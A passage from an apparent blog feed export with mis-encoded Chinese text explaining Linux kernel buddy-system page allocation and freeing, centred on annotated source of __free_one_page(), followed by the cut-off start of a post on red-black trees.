åˆ™è¿›è¡Œä¸€ç³»åˆ—çš„è­¦å‘Šï¼Œå¹¶è°ƒç”¨ <code>__alloc_pages_cpuset_fallback()</code> å†æ¬¡å°è¯•å†…å­˜åˆ†é…ï¼Œè‹¥æœªæˆåŠŸåˆ™è·³å›ï¼ˆretryï¼‰</li><li>è¿”å›ç»“æœ</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°"><a href="#å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°" class="headerlink" title="å››ã€ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°"></a>å››ã€<em>ä¸Šå±‚å°è£…åˆ†é…å‡½æ•°</em></h2><p>åœ¨ <code>__alloc_pages_nodemask()</code> ä¸Šå±‚ä¸»è¦æœ‰ä¸‰ä¸ªé¡µé¢åˆ†é…å‡½æ•°ï¼Œå…¶è°ƒç”¨è·¯å¾„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__alloc_pages_node  /*è¿”å›struct pageçš„æŒ‡é’ˆ*/</span><br><span class="line">    __alloc_pages</span><br><span class="line">    __alloc_pages_nodemask</span><br><span class="line"></span><br><span class="line">alloc_pages         /*è¿”å›struct pageçš„æŒ‡é’ˆ*/</span><br><span class="line">    alloc_pages_current</span><br><span class="line">    __alloc_pages_nodemask</span><br><span class="line">        </span><br><span class="line">__get_free_pages    /*è¿”å›é¡µé¢çš„è™šæ‹Ÿåœ°å€*/</span><br><span class="line">    __get_free_pages</span><br><span class="line">    alloc_pages</span><br><span class="line">            alloc_pages_current</span><br><span class="line">            __alloc_pages_nodemask</span><br></pre></td></tr></table></figure><h1 id="0x03-é¡µçš„é‡Šæ”¾"><a href="#0x03-é¡µçš„é‡Šæ”¾" class="headerlink" title="0x03.é¡µçš„é‡Šæ”¾"></a>0x03.é¡µçš„é‡Šæ”¾</h1><p>å‰é¢æˆ‘ä»¬è®²äº†é¡µé¢æ˜¯å¦‚ä½•åˆ†é…çš„ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹é¡µé¢æ˜¯å¦‚ä½•é‡Šæ”¾çš„</p><h2 id="ä¸€ã€-free-one-page-ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°"><a href="#ä¸€ã€-free-one-page-ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°" class="headerlink" title="ä¸€ã€__free_one_page()ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°"></a>ä¸€ã€__free_one_page()ï¼šé‡Šæ”¾é¡µé¢çš„æ ¸å¿ƒå‡½æ•°</h2><p>è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢é‡Šæ”¾çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼Œæ‰€æœ‰çš„é¡µé¢é‡Šæ”¾ API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…</p><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ç‰¹å®šé¡µé¢é‡Šæ”¾åˆ°ç‰¹å®š zone ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„ <code>one page</code> ä¸æ˜¯ä¸€å¼ é¡µæ¡†è€Œæ˜¯ä¸€å—è¿ç»­å†…å­˜ï¼ˆå¯èƒ½æœ‰å¤šå¼ é¡µï¼‰</p><p>è¿˜éœ€è¦æ³¨æ„çš„æ˜¯è¿™æ˜¯ä¸€ä¸ªé‡Šæ”¾é¡µé¢çš„<strong>åŸºæœ¬å‡½æ•°</strong>ï¼Œæ•…æˆ‘ä»¬éœ€è¦æä¾›å¾…é‡Šæ”¾é¡µé¢çš„é¡µç»“æ„ä½“ï¼ˆstruct pageï¼‰ã€é¡µæ¡†å·ã€é¡µé¢å—çš„é˜¶ï¼ˆorderï¼‰ã€ç›®æ ‡ zoneã€è¿ç§»ç±»å‹ç­‰ä¿¡æ¯â€”â€”è¿™äº›ä¿¡æ¯é€šå¸¸ç”±ä¸Šå±‚å°è£…å‡½æ•°æä¾›ï¼Œè¿™ä¸ªå‡½æ•°æ‰€åšçš„åªæ˜¯ç®€å•åœ°å°†é¡µæŒ‚å›å¯¹åº”é“¾è¡¨å¹¶æ£€æŸ¥åˆå¹¶çš„æ“ä½œ</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * buddy system åˆ†é…å™¨çš„é‡Šæ”¾å‡½æ•°.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * buddy system çš„æƒ³æ³•æ˜¯ä¸ºå¤šç§â€œordersâ€çš„å†…å­˜å—</span></span><br><span class="line"><span class="comment"> * ç»´æŠ¤ä¸€ä¸ªç›´æ¥æ˜ å°„è¡¨ï¼ˆåŒ…å«ä½å€¼ï¼‰. åº•éƒ¨çº§åˆ«çš„è¡¨åŒ…å«</span></span><br><span class="line"><span class="comment"> * å¯¹æœ€å°çš„å¯åˆ†é…å†…å­˜å•å…ƒï¼ˆè¿™é‡Œä¾¿æ˜¯é¡µé¢ï¼‰çš„æ˜ å°„,</span></span><br><span class="line"><span class="comment"> * è€Œå¾€ä¸Šæ¯æ›´é«˜ä¸€çº§åˆ™æè¿°äº†ä»å…¶ä¸‹çš„ä¸€çº§çš„ä¸€å¯¹å•å…ƒï¼Œå› æ­¤æ˜¯&quot;buddies&quot;.</span></span><br><span class="line"><span class="comment"> * ä»é«˜å±‚çœ‹ï¼Œè¿™é‡Œæ‰€åšçš„ä»…æ˜¯åœ¨æ ‡è®°åº•å±‚å¯ç”¨çš„è¡¨é¡¹ï¼Œ</span></span><br><span class="line"><span class="comment"> * å¹¶æ ¹æ®éœ€è¦å‘ä¸Šä¼ æ’­æ›´æ”¹ï¼Œå†åŠ ä¸Šä¸€äº›ä¸ VM ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†</span></span><br><span class="line"><span class="comment"> * è‰¯å¥½åä½œæ‰€éœ€è¦çš„è®¡æ•°ã€‚</span></span><br><span class="line"><span class="comment"> * åœ¨æ¯ä¸ªçº§åˆ«, æˆ‘ä»¬éƒ½ä¿æŒä¸€ä¸ª pages çš„ list, ä½œä¸ºè¿ç»­çš„</span></span><br><span class="line"><span class="comment"> * é•¿åº¦ä¸º(1 &lt;&lt; order)çš„ç©ºé—²é¡µçš„å¤´èŠ‚ç‚¹å¹¶æ ‡è®°ä¸Š PageBuddy.</span></span><br><span class="line"><span class="comment"> * Page&#x27;s order è¢«è®°å½•åœ¨ page_private(page) åŸŸ.</span></span><br><span class="line"><span class="comment"> * æ•…å½“æˆ‘ä»¬åœ¨åˆ†é…æˆ–é‡Šæ”¾å…¶ä¸€æ—¶, æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªçš„çŠ¶æ€ã€‚</span></span><br><span class="line"><span class="comment"> * ä¹Ÿå°±æ˜¯è¯´ï¼Œè‹¥æˆ‘ä»¬åˆ†é…ä¸€ä¸ªå°çš„å—ï¼Œè€Œä¸¤ä¸ªéƒ½æ˜¯ç©ºé—²çš„ï¼Œ</span></span><br><span class="line"><span class="comment"> * åŒºåŸŸçš„å‰©ä½™éƒ¨åˆ†å¿…é¡»è¢«åˆ†å‰²æˆå—. è‹¥ä¸€ä¸ªå—è¢«é‡Šæ”¾äº†ï¼Œ</span></span><br><span class="line"><span class="comment"> * è€Œä»–çš„ buddy ä¹Ÿæ˜¯é—²ç½®çš„, é‚£ä¹ˆè¿™å°†è§¦å‘åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„å—</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- nyc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __free_one_page(<span class="keyword">struct</span> page *page,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pfn,</span><br><span class="line"><span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span><br><span class="line"><span class="type">int</span> migratetype, <span class="type">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span> *<span class="title">capc</span> =</span> task_capc(zone);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> buddy_pfn;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> combined_pfn;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"><span class="type">bool</span> to_tail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿™é‡Œçš„ MAX_ORDER å’Œ pageblock_order éƒ½æ˜¯å®</span></span><br><span class="line">max_order = <span class="type">min_t</span>(<span class="type">unsigned</span> <span class="type">int</span>, MAX_ORDER - <span class="number">1</span>, pageblock_order);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!zone_is_initialized(zone));</span><br><span class="line">VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(migratetype == <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (likely(!is_migrate_isolate(migratetype)))</span><br><span class="line">__mod_zone_freepage_state(zone, <span class="number">1</span> &lt;&lt; order, migratetype);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(pfn &amp; ((<span class="number">1</span> &lt;&lt; order) - <span class="number">1</span>), page);</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, page), page);</span><br><span class="line"></span><br><span class="line">continue_merging:</span><br><span class="line"><span class="keyword">while</span> (order &lt; max_order) &#123;</span><br><span class="line"><span class="keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">migratetype);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">buddy_pfn = __find_buddy_pfn(pfn, order);<span class="comment">// è®¡ç®— buddy é¡µæ¡†å·</span></span><br><span class="line">buddy = page + (buddy_pfn - pfn);<span class="comment">// è®¡ç®— buddy çš„é¡µç»“æ„ä½“ï¼Œæ³¨æ„è¿™é‡Œæ˜¯æŒ‡é’ˆåŠ æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="comment">// é¡µæ¡†å·åˆæ³•æ€§æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"><span class="keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="comment">// æ£€æŸ¥ page å’Œ buddy æ˜¯å¦æ˜¯ä¸€å¯¹</span></span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬çš„ buddyï¼ˆè¯‘æ³¨ï¼šé‡Šæ”¾é¡µé¢çš„â€œé…å¯¹â€é¡µé¢ï¼Œå¯ä»¥çœ‹å¼€å¤´çš„æ³¨é‡Šï¼‰ æ˜¯ç©ºé—²çš„</span></span><br><span class="line"><span class="comment"> * æˆ–å…¶ä¸º CONFIG_DEBUG_PAGEALLOC çš„ guard pageï¼Œ</span></span><br><span class="line"><span class="comment"> * ä¸å…¶åˆå¹¶åå‡åˆ°é«˜ä¸€çº§çš„orderã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (page_is_guard(buddy))</span><br><span class="line">clear_page_guard(zone, buddy, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">del_page_from_free_list(buddy, zone, order);</span><br><span class="line">combined_pfn = buddy_pfn &amp; pfn;</span><br><span class="line">page = page + (combined_pfn - pfn);</span><br><span class="line">pfn = combined_pfn;</span><br><span class="line">order++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER - <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">/* è‹¥æˆ‘ä»¬åˆ°äº†è¿™ï¼Œè¿™æ„å‘³ç€ order &gt;= pageblock_order.</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬æƒ³è¦é¢„é˜²åœ¨å¸¸è§„ pageblock ä¸ç‹¬ç«‹çš„pageblock ä¹‹é—´çš„åˆå¹¶ã€‚</span></span><br><span class="line"><span class="comment"> * æ²¡æœ‰è¿™ä¸ªï¼Œpageblockéš”ç¦»å¯èƒ½é€ æˆé”™è¯¯çš„ç©ºé—²é¡µæˆ–CMAè®¡æ•°. </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬ä¸æƒ³ä¸ºäº†æ›´é¢‘ç¹çš„ä½é˜¶åˆå¹¶ä½¿ç”¨è¿™ä¸ªä»£ç </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;</span><br><span class="line"><span class="type">int</span> buddy_mt;</span><br><span class="line"></span><br><span class="line">buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line">buddy = page + (buddy_pfn - pfn);</span><br><span class="line">buddy_mt = get_pageblock_migratetype(buddy);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (migratetype != buddy_mt</span><br><span class="line">&amp;&amp; (is_migrate_isolate(migratetype) ||</span><br><span class="line">is_migrate_isolate(buddy_mt)))</span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line">&#125;</span><br><span class="line">max_order = order + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">goto</span> continue_merging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done_merging:</span><br><span class="line">set_buddy_order(page, order); <span class="comment">// åœ¨ page-&gt;private ä¸­å‚¨å­˜å…¶ order</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ˜¯æ’åˆ°é“¾è¡¨å¤´è¿˜æ˜¯é“¾è¡¨å°¾</span></span><br><span class="line"><span class="keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)</span><br><span class="line">to_tail = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (is_shuffle_order(order))</span><br><span class="line">to_tail = shuffle_pick_tail();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="comment">// è¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²</span></span><br><span class="line">        <span class="comment">// è‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨</span></span><br><span class="line">        <span class="comment">// è¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢</span></span><br><span class="line">to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’å…¥ç‰¹å®šè¿ç§»é“¾è¡¨</span></span><br><span class="line"><span class="keyword">if</span> (to_tail)</span><br><span class="line">add_to_free_list_tail(page, zone, order, migratetype);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_to_free_list(page, zone, order, migratetype);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notify page reporting subsystem of freed page */</span></span><br><span class="line"><span class="keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))</span><br><span class="line">page_reporting_notify_free(order);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¸å¾…é‡Šæ”¾é¡µé¢å‡‘æˆä¸€å¯¹çš„å†…å­˜å—ç§°ä¸º buddyï¼Œæ‰€è°“å‡‘æˆä¸€å¯¹ä¾¿æ˜¯<strong>è¿™ä¸¤ä¸ªå†…å­˜å—åœ¨ç‰©ç†ä¸Šè¿ç»­ï¼Œä¸”èƒ½å‡‘æˆä¸€ä¸ªæ›´é«˜ä¸€é˜¶çš„å¤§å†…å­˜å—</strong>ï¼Œç”±æ­¤ç§°ä¹‹ä¸ºä¸€å¯¹ buddies</p><p>è¯¥å‡½æ•°ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ï¼ˆcontinue_mergingï¼Œå¾ªç¯å¼€å¤´ï¼‰è°ƒç”¨ <code>__find_buddy_pfn()</code> è®¡ç®—å¾…é‡Šæ”¾é¡µé¢çš„ buddy çš„ç¬¬ä¸€å¼ ç‰©ç†é¡µçš„é¡µæ¡†å·ï¼Œç®—æ³•æ¯”è¾ƒæš´åŠ›ï¼š<code>page_pfn ^ (1 &lt;&lt; order)</code></li><li>è°ƒç”¨ <code>page_is_buddy()</code> æ£€æŸ¥ buddy ä¸ å¾…é‡Šæ”¾é¡µé¢æ˜¯å¦æ˜¯ä¸€å¯¹ buddiesï¼Œè‹¥å¦ï¼Œåˆ™è·³åˆ°ï¼ˆdone_mergingï¼‰ï¼Œè¿™é‡Œçš„æ£€æŸ¥éœ€è¦æ»¡è¶³å››ä¸ªè¦ç´ ï¼š<ul><li>buddy ä¸åœ¨ç©ºæ´ä¸­</li><li>buddy åœ¨ buddy system ä¸­ï¼ˆå³ buddy ä¹Ÿæ˜¯ç©ºé—²å†…å­˜å—ï¼‰</li><li>å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy åœ¨åŒä¸€ä¸ª zone ä¸­</li><li>å¾…é‡Šæ”¾é¡µé¢ä¸å…¶ buddy æœ‰ç€åŒæ ·çš„é˜¶ï¼ˆorderï¼‰</li></ul></li><li>è‹¥ buddy ä¸º guard pageï¼Œåˆ™è°ƒç”¨ <code>clear_page_guard()</code> æ¸…æ¥šè¿™ä¸ªå±æ€§è®©å…¶å˜æˆç©ºé—²é¡µé¢ï¼Œè¿™é‡Œæ¸…é™¤çš„æ“ä½œæ˜¯é€šè¿‡å°† page ç»“æ„ä½“çš„ private å­—æ®µç½® 0 å®ç°çš„ï¼›è‹¥å¦ï¼Œåˆ™è¯´æ˜æ˜¯å¸¸è§„çš„ç©ºé—²é¡µé¢ï¼Œè°ƒç”¨ <code>del_page_from_free_list()</code> å°†å…¶è„±é“¾</li><li>æ­¤æ—¶æˆ‘ä»¬çš„æ–°çš„é«˜é˜¶å†…å­˜å—å°±å®Œæˆåˆæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å›åˆ°å¾ªç¯å¼€å¤´é‡æ–°å¯»æ‰¾è¿™ä¸ªåˆæˆçš„æ–°å†…å­˜å—çš„ buddyï¼Œè¿™ä¸ªå¾ªç¯ä¸€ç›´æŒç»­åˆ° <code>max_order</code> ï¼ˆä¸€èˆ¬æ˜¯10ï¼‰ï¼Œä½œä¸ºä¸‹ä¸€æ¬¡å¾ªç¯çš„é¡µæ¡†å·çš„è®¡ç®—æ–¹å¼æ˜¯ <code>buddy_pfn &amp; pfn</code>ï¼Œä¹‹ååšæŒ‡é’ˆè¿ç®— <code>page + (combined_pfn - pfn)</code> æ‰¾åˆ°å¯¹åº”çš„ page ç»“æ„ä½“</li><li>è‹¥é€€å‡ºå¾ªç¯æ—¶çš„ order æ»¡è¶³ <code>order &lt; MAX_ORDER - 1</code> ï¼Œåˆ™è°ƒç”¨ <code>has_isolate_pageblock()</code> æ£€æŸ¥ zone ä¸­æ˜¯å¦æœ‰ isolate blockï¼Œè‹¥æ˜¯åˆ™è¿›è¡Œç›¸å…³æ“ä½œï¼ˆ<del>è¿™å—ä»£ç è¿˜æ²¡çœ‹æ‡‚</del>ï¼‰ï¼Œæœ€åè·³è½¬å›ï¼ˆcontinue_mergingï¼‰ï¼›è¿™ä¸€æ­¥ä¸»è¦æ˜¯é˜²æ­¢ isolate pageblock ä¸å¸¸è§„çš„ pageblock å‘ç”Ÿåˆå¹¶</li><li>ï¼ˆdone_mergingï¼‰è¿™ä¸€æ­¥ä¸»è¦æ˜¯è°ƒç”¨ <code>set_buddy_order()</code> åœ¨ page ç»“æ„ä½“çš„ private å­—æ®µå­˜æ”¾è¯¥å†…å­˜å—çš„ order</li><li>è‹¥æ˜¯è®¾ç½®äº† <code>FPI_TO_TAIL</code> flagï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸º trueï¼›å¦åˆ™ï¼Œè‹¥å†…å­˜å—çš„ <code>order &gt;= SHUFFLE_ORDER</code>ï¼ˆ<code>MAX_ORDER - 1</code>ï¼‰ï¼Œåˆ™å°† <code>to_tail</code> ç½®ä¸ºéšæœºç»“æœï¼ˆ<code>shuffle_pick_tail()</code>ï¼‰ï¼›å¦åˆ™ç½®ä¸ºè°ƒç”¨ <code>buddy_merge_likely()</code> çš„ç»“æœï¼Œè¯¥å‡½æ•°ä¼šæ£€æŸ¥æ˜¯å¦ä¸‹ä¸€ä¸ªæœ€é«˜é˜¶çš„ buddy æ˜¯å¦ç©ºé—²ï¼Œè‹¥æ˜¯ï¼Œåˆ™å¯èƒ½æ­£åœ¨é‡Šæ”¾çš„é¡µé¢å—å°†å¾ˆå¿«è¢«åˆå¹¶ï¼Œæ­¤æ—¶æˆ‘ä»¬åº”å½“å°†å…¶æ·»åŠ åˆ°é“¾è¡¨çš„å°¾éƒ¨ï¼Œè¿™æ ·å°±ä¸å¤§å¯èƒ½åˆè¢«åˆ«çš„è¿›ç¨‹å¾ˆå¿«å°±åˆ†é…èµ°äº†ï¼Œè€Œæ˜¯å¯èƒ½è¢«åˆå¹¶ä¸ºé«˜é˜¶é¡µé¢</li><li>è‹¥ <code>to_tail</code> ä¸ºçœŸï¼Œåˆ™è°ƒç”¨ <code>add_to_free_list_tail()</code> å°†è¯¥ç©ºé—²é¡µæ·»åŠ åˆ°é“¾è¡¨æœ«å°¾ï¼Œå¦åˆ™è°ƒç”¨ <code>add_to_free_list()</code> æ·»åŠ åˆ°é“¾è¡¨å¼€å¤´</li></ul><h2 id="äºŒã€ä¸Šå±‚å°è£…å‡½æ•°"><a href="#äºŒã€ä¸Šå±‚å°è£…å‡½æ•°" class="headerlink" title="äºŒã€ä¸Šå±‚å°è£…å‡½æ•°"></a>äºŒã€<em>ä¸Šå±‚å°è£…å‡½æ•°</em></h2><p>æ‰€æœ‰é¡µé¢é‡Šæ”¾çš„å‡½æ•°å…¶å®éƒ½æ˜¯å¯¹ <code>__free_one_page()</code> çš„å°è£…ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°ï¼Œè·¯å¾„å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/06/ktV7cNlohiQCSWP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEY DUDE!&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="buddy system" scheme="http://blog.arttnba3.cn/tags/buddy-system/"/>
    
  </entry>
  
  <entry>
    <title>ã€ALGORITHM.0x04ã€‘ä»äºŒå‰æœç´¢æ ‘å¼€å§‹æ‰‹æ’•çº¢é»‘æ ‘</title>
    <link href="http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/"/>
    <id>http://blog.arttnba3.cn/2022/05/28/ALGORITHM-0X04-RED_BLACK_TREE/</id>
    <published>2022-05-27T21:50:46.000Z</published>
    <updated>2022-05-30T04:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>é¢è¯•å®˜ï¼šå¬è¯´ä½ ç®—æ³•è¿˜è¡Œï¼Œæ¥ç»™ğŸ‘´ç®€å•æ‰‹å†™ä¸ªçº¢é»‘æ ‘å°±è®©ä½ è¿‡äº†</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><strong>çº¢é»‘æ ‘</strong>ï¼ˆred black treeï¼‰æ˜¯è‡ªå¹³è¡¡äºŒå‰æœç´¢æ ‘çš„ä¸€ç§ï¼Œå…¶ç‰¹ç‚¹åœ¨äºèƒ½å¤Ÿé«˜æ•ˆåœ°åœ¨æ’å…¥ä¸åˆ é™¤æ“ä½œæ—¶å®ç°è‡ªå¹³è¡¡ï¼Œ<strong>å¯ä»¥åœ¨ O(log N) æ—¶é—´å†…å®ŒæˆæŸ¥æ‰¾ã€æ’å…¥ã€åˆ é™¤</strong>ï¼Œéå¸¸ææ€–ï¼Œ<strong>ç›¸åº”åœ°çº¢é»‘æ ‘çš„å®ç°ä»£ç ä¹Ÿéå¸¸å¤æ‚</strong><del>ï¼Œå› æ­¤æ®ä¼ æŸå¤§å‚é¢è¯•å®˜ä¸ºäº†åˆéš¾é¢è¯•è€…å°±ä¼šå¤©å¤©è€ƒä»–ä»¬æ‰‹æ’•çº¢é»‘æ ‘</del></p><p>åˆšå¥½ç¬”è€…åœ¨é˜…è¯» Linux kernel æºç 